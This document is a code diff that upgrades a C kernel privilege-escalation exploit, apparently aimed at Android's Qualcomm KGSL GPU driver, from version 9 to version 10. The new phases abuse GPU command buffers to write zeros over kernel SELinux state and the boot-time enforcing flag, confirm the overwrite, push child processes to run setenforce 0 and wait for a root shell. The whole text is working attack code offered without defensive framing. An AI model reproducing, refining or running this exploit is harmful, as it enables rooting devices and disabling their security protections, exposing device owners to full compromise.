@@ -120,6 +120,7 @@ uint64_t get_kaslr_offset(void) {
     uint64_t stext = read_kallsyms_symbol("_stext");
     if (stext) {
         int64_t kaslr = (int64_t)(stext - VMLINUX_TEXT);
+        kaslr &= ~0x1FFFFFLL;
         return (uint64_t)kaslr;
     }
     struct perf_event_attr pe = {0};
@@ -236,7 +237,7 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] Combined AVC+Cred exploit v9\n");
+    printf("[+] Combined AVC+Cred exploit v10 (aggressive SELinux zeroing)\n");
 
     uint64_t kaslr = get_kaslr_offset();
     if (!kaslr) {
@@ -498,11 +499,78 @@ int main(int argc, char **argv) {
         printf("  Cred overwrite done\n");
     }
 
-    printf("[*] Phase 9: Signal children to try setenforce 0\n");
+    printf("[*] Phase 9: Aggressive SELinux state zeroing (0x0..0x100)\n");
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int off = 0; off < 0x100; off++) {
+            uint64_t addr = selinux_state_addr + off;
+            uint32_t al, ah;
+            split64(addr, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al;
+            cmd[dw++] = ah;
+            cmd[dw++] = 0;
+        }
+        for (int off = 0; off < 0x100; off++) {
+            uint64_t addr = enforcing_boot_addr + off;
+            uint32_t al, ah;
+            split64(addr, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al;
+            cmd[dw++] = ah;
+            cmd[dw++] = 0;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx, ts);
+        for (int i = 0; i < 3; i++) {
+            flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
+            usleep(10000);
+        }
+    }
+
+    printf("[*] Phase 10: Verify selinux_state after zeroing\n");
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < 16; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(selinux_state_addr + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx, ts);
+        __sync_synchronize();
+        uint32_t *d = (uint32_t *)dst_m;
+        printf("  selinux_state[0..15]:");
+        for (int i = 0; i < 16; i++) {
+            if (i % 8 == 0) printf("\n    ");
+            printf("%08x ", d[i]);
+        }
+        printf("\n");
+        if (d[0] == 0 && d[1] == 0 && d[2] == 0 && d[3] == 0)
+            printf("[+] selinux_state appears zeroed\n");
+    }
+
+    printf("[*] Phase 11: Signal children to try setenforce 0\n");
     for (int i = 0; i < n_spray; i++) write(setenforce_pipe[1], "S", 1);
     close(setenforce_pipe[1]);
 
-    printf("[*] Phase 10: Wait for root shell\n");
+    printf("[*] Phase 12: Wait for root shell\n");
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
     if (poll(&pfd, 1, 15000) > 0 &&
